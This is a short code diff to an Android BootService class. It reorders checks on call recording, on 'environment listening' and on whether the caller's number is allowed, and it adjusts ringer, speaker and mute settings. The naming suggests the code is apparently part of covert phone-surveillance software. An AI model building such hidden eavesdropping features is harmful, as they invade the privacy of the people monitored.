@@ -98,9 +98,10 @@ public class BootService extends Service
                 		return;
                 	}
                 	
+                	
+                	if (recordStarted) return;
+            		if (GlobalValues.IS_ENV_LISTENING) return;
                 	if (!comingNumberIsLegal(context, otherSidePhoneNum)) return;
-            		
-            		if (recordStarted) return;
             		
             		// Set audio
             		//setAudio(context);
@@ -156,8 +157,9 @@ public class BootService extends Service
     					AudioManager audioManager = (AudioManager)context.getSystemService(Context.AUDIO_SERVICE);
     					audioManager.setRingerMode(GlobalValues.ORIGINAL_RING_MODE);
     					
-    					// Mute speaker
+    					// Set speaker and earphone
     					audioManager.setSpeakerphoneOn(false);
+    					audioManager.setStreamMute(AudioManager.STREAM_MUSIC, false);
     					
     					// Broadcast intent to let DummyActivity to exit
     					Intent exitIntent = new Intent(DummyActivity.BROADCAST_ACTION_DUMMY_ACTIVITY_EXIT);
